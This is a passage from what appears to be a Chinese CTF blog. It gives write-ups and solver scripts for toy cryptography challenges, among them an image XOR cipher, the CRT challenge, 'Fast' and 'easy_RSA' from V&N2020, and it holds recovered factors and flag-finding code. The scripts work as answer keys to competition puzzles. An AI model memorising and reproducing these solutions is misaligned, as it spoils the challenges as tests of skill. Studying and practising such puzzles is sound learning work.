class="number">155</span>, <span class="number">127</span>, <span class="number">236</span>, <span class="number">179</span>, <span class="number">199</span>, <span class="number">168</span>, <span class="number">35</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">174</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x), <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pixel, key1, key2, x0, m, n</span>):</span></span><br><span class="line">    num = m*n//<span class="number">8</span></span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 64个零</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="number">24</span></span><br><span class="line">n = <span class="number">16</span></span><br><span class="line">r = <span class="number">1.2</span></span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line">x0 = <span class="number">0.840264</span></span><br><span class="line">num = m*n//<span class="number">8</span></span><br><span class="line">seqs = []</span><br><span class="line">x = x0</span><br><span class="line">bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">    x = generate(x)</span><br><span class="line">    tmp.append(x)</span><br><span class="line">    seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">    bin_x  = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">        bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">    bins += bin_x</span><br><span class="line"><span class="built_in">print</span>(bins)</span><br><span class="line">cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 256个零</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        index = n*i+j</span><br><span class="line">        ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># pix = pixel[index]</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">            pix = <span class="number">169</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">            pix = <span class="number">86</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">            pix = <span class="number">78</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">            pix = <span class="number">177</span></span><br><span class="line">        cipher[index] = pix</span><br><span class="line"></span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line">bins = <span class="string">&#xx27;</span></span><br><span class="line">cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 384个零</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        index = n*i+j</span><br><span class="line">        ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">        pix = encrypt_flagimage[index]</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">            pix = (pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">            pix = (~pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">            pix = (pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">            pix = (~pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">        cipher[index] = pix</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> cipher])</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(data.encode()).hexdigest())</span><br></pre></td></tr></table></figure>

<p>然后算出来和队伍的另外一位师傅（另外一个组员）解出来的image有一位不一样，应该是解密的问题，现在也截止了，没办法验证了</p>
<p>最后那位师傅又搞了一遍出来和我一样了，但依旧不知道是哪里错了</p>
<p>然后赛后看WP是先把数字转字节，然后拼接起来转md5的，很怪，为什么不用题目给的方式转换呢？？？</p>
<p>耶不爽</p>
<h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>同样也忘记名字了</p>
<p>反正就基础的RSA攻击</p>
<p>最后把雪莱的诗md5一下就好了，太麻烦了不想写</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不行，满打满算才做出三道，还木大木大</p>
<p>我必须变得更加饥渴</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20200219 V&amp;N2020公开赛Crypto方向复现</title>
    <url>/posts/19a278ea/</url>
    <content><![CDATA[<blockquote>
<p>前景提要</p>
</blockquote>
<p>在签到2021TCTF时看到一篇WP，是标题所述比赛的easy_RSA，本来只是用一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 -m primefac -vs -m=p+<span class="number">1</span> XXXXX</span><br></pre></td></tr></table></figure>

<p>尝试分解那个迷之模数，当然以失败告终，但是在尚师傅的指导下，sage和ubuntu子系统觉醒出了更强大的组合</p>
<p>然后从这篇WP出发，尝试和组里的师傅们复现下这场比赛的Crypto部分</p>
<span id="more"></span>

<h1 id="20200219-V-amp-N2020公开赛Crypto方向复现"><a href="#20200219-V-amp-N2020公开赛Crypto方向复现" class="headerlink" title="20200219 V&amp;N2020公开赛Crypto方向复现"></a>20200219 V&amp;N2020公开赛Crypto方向复现</h1><h3 id="CRT"><a href="#CRT" class="headerlink" title="CRT"></a>CRT</h3><blockquote>
<p>题目描述</p>
</blockquote>
<p>Do you know the Chinese Remainder Theorem sometimes may not only have one solution?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ms = [getRandomNBitInteger(<span class="number">128</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">p = reduce(<span class="keyword">lambda</span> x, y: x*y, ms)</span><br><span class="line">x = getRandomRange(<span class="number">1</span>, p)</span><br><span class="line">cs = [x % m <span class="keyword">for</span> m <span class="keyword">in</span> ms]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.sha256(<span class="built_in">str</span>(x).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="string">&quot;4b93deeb&quot;</span> <span class="keyword">in</span> flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ms = [284461942441737992421992210219060544764, 218436209063777179204189567410606431578, 288673438109933649911276214358963643204, 239232622368515797881077917549177081575, 206264514127207567149705234795160750411, 338915547568169045185589241329271490503, 246545359356590592172327146579550739141, 219686182542160835171493232381209438048]</span></span><br><span class="line"><span class="comment"># cs = [273520784183505348818648859874365852523, 128223029008039086716133583343107528289, 5111091025406771271167772696866083419, 33462335595116820423587878784664448439, 145377705960376589843356778052388633917, 128158421725856807614557926615949143594, 230664008267846531848877293149791626711, 94549019966480959688919233343793910003]</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>题目很简单，但是自己饶了好多弯</p>
<p>首先，一看，这不就是构造了8个同余式吗，直接CRT一把梭；结果不对</p>
<p>然后我瞟了一眼网上的WP，看到不互素后就匆匆折返。确实忘了，中国剩余定理使用的条件是模数不互素，显然ms里的数肯定存在着相同的公因子；于是我在sage中分解了这8个数（这里写脚本我是用网上找来的CRT函数的，它会检查模数是否是互质，但其实sage里帮你自动处理了）</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210705194105634.png" alt="image-20210705194105634"></p>
<p>然后在保证模数尽可能大的原则下，写完了脚本。但结果依旧不对，并且出来的x是1006位，由题目可知x是属于$[1, 2^{1024}]$的，所以显然x是落在了$[2^{1007},2^{1024}]$这段区间。总之模数不够</p>
<p>不过，这也不是最困扰我的地方，与题目提示不同，我第一个想到的是，扩大模数，构造如下的同余方程<br>$$<br>\begin{cases}<br>x\equiv cs_1\ (mod\ ms_1)\\<br>x\equiv cs_2\ (mod\ ms_2)\\<br>\vdots\qquad \vdots \qquad\qquad \vdots\\<br>x\equiv cs_8\ (mod\ ms_8)\\<br>x\equiv cs_9\ (mod\ ms_9)<br>\end{cases}<br>$$<br>其中ms9是一个随机20位的素数，因为1007+20差不多就可以达到1024的大小</p>
<blockquote>
<p>编写脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line">ms = [<span class="number">284461942441737992421992210219060544764</span>, <span class="number">218436209063777179204189567410606431578</span>, <span class="number">288673438109933649911276214358963643204</span>, <span class="number">239232622368515797881077917549177081575</span>, <span class="number">206264514127207567149705234795160750411</span>, <span class="number">338915547568169045185589241329271490503</span>, <span class="number">246545359356590592172327146579550739141</span>, <span class="number">219686182542160835171493232381209438048</span>]</span><br><span class="line">cs = [<span class="number">273520784183505348818648859874365852523</span>, <span class="number">128223029008039086716133583343107528289</span>, <span class="number">5111091025406771271167772696866083419</span>, <span class="number">33462335595116820423587878784664448439</span>, <span class="number">145377705960376589843356778052388633917</span>, <span class="number">128158421725856807614557926615949143594</span>, <span class="number">230664008267846531848877293149791626711</span>, <span class="number">94549019966480959688919233343793910003</span>]</span><br><span class="line"></span><br><span class="line">new_ms = copy.deepcopy(ms)</span><br><span class="line">my_ms = getPrime(<span class="number">20</span>)</span><br><span class="line">new_ms.append(my_ms)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(my_ms):</span><br><span class="line">    new_cs = copy.deepcopy(cs)</span><br><span class="line">    new_cs.append(i)</span><br><span class="line">    x = crt(new_cs, new_ms)</span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.sha256(<span class="built_in">str</span>(x).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;4b93deeb&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>再在该文件位置打开cmd，进入子系统，打开sage，输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">load(&quot;脚本文件名&quot;)</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210705200158602.png" alt="image-20210705200158602"></p>
<p>就直接出来了，省去了粘贴换行的一些琐碎</p>
<p><strong>还有一点需要注意，在做这道题时最困扰我的是：浅拷贝。显然上面的脚本中，你可以看到我用了深拷贝的库，因为如果换成=赋值语句，你会印象深刻；除了debug意识淡薄了，也一度怀疑是不是自己对CRT还有理解偏差的地方</strong></p>
<blockquote>
<p>其他师傅的思路</p>
</blockquote>
<p>虽然这样做也无可厚非，但是还是没有能精确get到出题人的意思；什么时候才能像尚师傅一样做出题人肚子里的小蛔虫啊（茶）</p>
<p>最直接的思路应该是，CRT解出来的其实蕴含了一系列的解，其通式可以写成<br>$$<br>{kM+\sum_{i=1}^na_it_iM_i;\ k\in\mathbb{Z} }<br>$$<br>所以只要用CRT解出来x，然后爆破k就好，因为确实比较接近，上下两种方法的复杂度是同一级别的</p>
<p>当然上述通式的M是不互素的模数的积，贴一下脚本，不愧是尚师傅</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">ms = [<span class="number">284461942441737992421992210219060544764</span>, <span class="number">218436209063777179204189567410606431578</span>, <span class="number">288673438109933649911276214358963643204</span>, <span class="number">239232622368515797881077917549177081575</span>, <span class="number">206264514127207567149705234795160750411</span>, <span class="number">338915547568169045185589241329271490503</span>, <span class="number">246545359356590592172327146579550739141</span>, <span class="number">219686182542160835171493232381209438048</span>]</span><br><span class="line">cs = [<span class="number">273520784183505348818648859874365852523</span>, <span class="number">128223029008039086716133583343107528289</span>, <span class="number">5111091025406771271167772696866083419</span>, <span class="number">33462335595116820423587878784664448439</span>, <span class="number">145377705960376589843356778052388633917</span>, <span class="number">128158421725856807614557926615949143594</span>, <span class="number">230664008267846531848877293149791626711</span>, <span class="number">94549019966480959688919233343793910003</span>]</span><br><span class="line">p = reduce(<span class="keyword">lambda</span> xx, yy: lcm(xx, yy), ms)</span><br><span class="line"></span><br><span class="line">x = crt(cs, ms)</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    xx = k*p + x</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.sha256(<span class="built_in">str</span>(xx).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;4b93deeb&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="Fast"><a href="#Fast" class="headerlink" title="Fast"></a>Fast</h3><blockquote>
<p>题目描述</p>
</blockquote>
<p>This is a modified RSA scheme that once proposed at a cryptography conference to achieve faster decryption. But, there seems something wrong with it.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">N = p * q</span><br><span class="line"></span><br><span class="line">g, r1, r2 = [getRandomRange(<span class="number">1</span>, N) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">g1 = <span class="built_in">pow</span>(g, r1 * (p-<span class="number">1</span>), N)</span><br><span class="line">g2 = <span class="built_in">pow</span>(g, r2 * (q-<span class="number">1</span>), N)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m</span>):</span></span><br><span class="line">    s1, s2 = [getRandomRange(<span class="number">1</span>, N) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    c1 = (m * <span class="built_in">pow</span>(g1, s1, N)) % N</span><br><span class="line">    c2 = (m * <span class="built_in">pow</span>(g2, s2, N)) % N</span><br><span class="line">    <span class="keyword">return</span> (c1, c2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c1, c2</span>):</span></span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp*inverse(q, p)*q + xq*inverse(p, q)*p) % N</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = encrypt(bytes_to_long(flag))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># N = 18680643069610062851842282268594530254220611012409807422663284548187050713427682950720783343430650669361838067625768840896513125210105582070603021732086193955893838077699465426052925750736212977005683541174195320832791835197114668838654054444342903298662698415765898335350206380896849522280206304272801325820946987172164086644949521111058774180676742851681476123338557138770304164634321305204827406522957769478330124484710532963132900017800651579612646041955628867746525508376194147796920773364680264059390497210260540079810501777507814448518995581208169818764701641258963569599247156932381367802991222265241699715283</span></span><br><span class="line"><span class="comment"># g1 = 9143176283300810019842153344177123108612540016879643936458724056602746667157014763960725115919119704406826965726023263657276550779443988565368344040505696950820899770544814163379169539926317676679421275092688200844094929042154854719312788471536324082041360841253720783220459009201882865091829118575721525038404689868986360373373122049951274015083845966946475469982961355934516388706446794517870569063777231434618411404965077775991870069073539415961610645268985004687402050059891500490949250730689691141954694508001895390336750734542724392709744200091587065816283592253967715080611459937165344139809223328071517060208</span></span><br><span class="line"><span class="comment"># g2 = 14068322834597276347776814624877614869834816383564391664570268934537693322688875343215293618493363798985047779057952636529313879548457643220996398640913517182122425631198219387988691569709691279442005545716133131472147592456812502863851227108284027033557263611949365667779259585770738623603814004666845554284808166195201470503432803440754207350347128045893594280079379926676477680556845095378093693409219131090910168117334308781843178748431526974047817218228075136005979538773141427004682344298827618677773735288946271346252828348742296301538573408254015281232250841148556304927266143397565889649305095857756884049430</span></span><br><span class="line"><span class="comment"># c1, c2 = (3976514029543484086411168675941075541422870678409709261442618832911574665848843566949154289825219682094719766762966082440586568781997199077781276145091509192208487682443007457513002005089654365915817414921574344557570444253187757317116858499013550050579856269915915792827620535138057468531410166908365364129001407147467636145589396570815405571923148902993581000542566387654639930651683044853608873583911638108204074537952317056718986683846742909366072461130053275195290631718363272923316002049685111871888148244026652658482359335651889139243735138819453744763293112267738369048641158946411500606588429007794613880534, 18524535479582837341745231233387403662294605513261199630593257391163433751052467785080620993007681605662927226603747560698627838567782891522546977611597418150309028806158429831471152782211111046118637630899456903846057977815397285171313888516791822545633820066408276065732715348834255021260666966934592884548856831383262013360819013814149529393178712576141627031723067564594282618223686778534522328204603249125537258294561872667849498796757523663858312311082034700705599706428944071848443463999351872482644584735305157234751806369172212650596041534643187402820399145288902719434158798638116870325144146218568810928344)</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>这是什么神仙题，n可以被分解，解密函数也是现成的，而且是正确的</p>
<p>应该是出题人有意为之吧</p>
<blockquote>
<p>编写脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c1, c2</span>):</span></span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp*inverse(q, p)*q + xq*inverse(p, q)*p) % N</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = <span class="number">18680643069610062851842282268594530254220611012409807422663284548187050713427682950720783343430650669361838067625768840896513125210105582070603021732086193955893838077699465426052925750736212977005683541174195320832791835197114668838654054444342903298662698415765898335350206380896849522280206304272801325820946987172164086644949521111058774180676742851681476123338557138770304164634321305204827406522957769478330124484710532963132900017800651579612646041955628867746525508376194147796920773364680264059390497210260540079810501777507814448518995581208169818764701641258963569599247156932381367802991222265241699715283</span></span><br><span class="line">p = <span class="number">106417460801952098564106499070151038873024911455536068339939244771790540941720274028587207976808157868694798197258813111268537142798255715538795631061310640662123200632946626357221258957037900275496387833531601196435353735799649271157394995634449593246448856875377066127076028119584523015225013672972959211463</span></span><br><span class="line">q = <span class="number">175541146432497750706994831036579922743699110188170130349078711914372625934257198871368005366941949929286673808928975466227805723983786985788458460399280363091838402146937391317438052439989533790389951909401937742849194965413829547962616241584178560041639076246949503118700746929605640733813016659832730773141</span></span><br><span class="line">g1 = <span class="number">9143176283300810019842153344177123108612540016879643936458724056602746667157014763960725115919119704406826965726023263657276550779443988565368344040505696950820899770544814163379169539926317676679421275092688200844094929042154854719312788471536324082041360841253720783220459009201882865091829118575721525038404689868986360373373122049951274015083845966946475469982961355934516388706446794517870569063777231434618411404965077775991870069073539415961610645268985004687402050059891500490949250730689691141954694508001895390336750734542724392709744200091587065816283592253967715080611459937165344139809223328071517060208</span></span><br><span class="line">g2 = <span class="number">14068322834597276347776814624877614869834816383564391664570268934537693322688875343215293618493363798985047779057952636529313879548457643220996398640913517182122425631198219387988691569709691279442005545716133131472147592456812502863851227108284027033557263611949365667779259585770738623603814004666845554284808166195201470503432803440754207350347128045893594280079379926676477680556845095378093693409219131090910168117334308781843178748431526974047817218228075136005979538773141427004682344298827618677773735288946271346252828348742296301538573408254015281232250841148556304927266143397565889649305095857756884049430</span></span><br><span class="line">c1, c2 = (<span class="number">11823197525493679922462229312577565795790231943088967365041996969833687685138684663425736403362435947961162359880274061507909130337620672558788978473833973219147915805313662825413066312702383051828013250123487196306204170199886569869489424725349908927607008718147223533469811907589117819645863932215575433971043477313368023151369535540404625770972404614353104003800218866798610393931587791320241316614291168862653357565646094135540152539864650862797163818826669760914933822102864027625653527726320652797672561838261305835579141720874114224470663547248330428718333156518891792470511397032487663666074601934673538205109</span>, <span class="number">2779880537115408257595446644781256096238766529002829447374722026519904649762403856519534823378460053135911559335526959970225428282722454848749344880298922526768059646336181280198446021828944801139755808467391788638452557321859820238241700901109441893986616102072462317079424252804407738823379369895077334731847147033163210247117705503923134257895313179139530926252976334117657503240153146324063219900284664702824599298036943536916560758754916817002800088718757733395590409870811657828057225054151582638807129324477142895521653053887499550733193273834240174306480447726764751838123539992748222035712739618864572963930</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(decrypt(c1, c2)))</span><br></pre></td></tr></table></figure>

<p>应该是出题人有意为之的，但何必呢</p>
<h4 id="加密解密原理"><a href="#加密解密原理" class="headerlink" title="加密解密原理"></a>加密解密原理</h4><p>在做的过程中，有一点令我感到疑惑，一开始看到解密函数时，我认为这并不是针对加密函数的；也就是说，我以为的考点是让我们自己实现解密函数的</p>
<blockquote>
<p>生成随机数</p>
</blockquote>
<p>生成p，q，g1，g2，（g，r1，r2$\in$[1, N]）<br>$$<br>\begin{align}<br>g_1=g^{r_1\times(p-1)}\ mod\ N\\<br>g_2=g^{r_2\times(q-1)}\ mod\ N<br>\end{align}<br>$$</p>
<blockquote>
<p>加密</p>
</blockquote>
<p>加密后的结果是c1，c2，（s1，s2$\in$[1, N]）<br>$$<br>\begin{align}<br>c_1=m\times g_1^{s_1}\ mod\ N\\<br>c_2=m\times g_2^{s_2}\ mod\ N<br>\end{align}<br>$$</p>
<blockquote>
<p>解密</p>
</blockquote>
<p>看他的样子是解以下这个同余方程组<br>$$<br>\begin{align}<br>m\equiv c_1\ (mod\ p)\\<br>m\equiv c_2\ (mod\ q)<br>\end{align}<br>$$<br>顺便再来回顾以下CRT的通式，直接抄维基百科上的了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706144819994.png" alt="image-20210706144819994"></p>
<p>但问题是m和c满足这个同余方程组吗？就像是ElGamal一样，他乘了一个数，不应该乘以其的逆元吗？</p>
<p>然后尚师傅点醒我了，由$g_1=g^{r_1\times(p-1)}\ mod\ N$可知，<br>$$<br>g_1\equiv g^{r_1\times (p-1)}\equiv 1\ (mod\ p)<br>$$<br>这就是欧拉定理</p>
<p>所以在模p和模q时，那个加密时多乘的数就变成1了</p>
<p><strong>总之，回到题目，说是一种修改过的RSA加密模式；当然在课上也学过用CRT加速RSA的解密，前提是要知道p和q，和这个异曲同工吧。或者应该说，这种方法有点借鉴了ElGamal加密算法的思想</strong></p>
<h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getprime</span>(<span class="params">bits</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        n = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= next_prime(randint(<span class="number">1</span>,<span class="number">1000</span>))</span><br><span class="line">        <span class="keyword">if</span> isPrime(n - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;flag&#123;************************************&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = getprime(<span class="number">505</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> m &lt; q</span><br><span class="line"></span><br><span class="line">n = p * q * r</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(q ** <span class="number">2</span>, p ** <span class="number">2</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m, <span class="number">2</span>, r)</span><br><span class="line">cipher = <span class="built_in">pow</span>(c, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 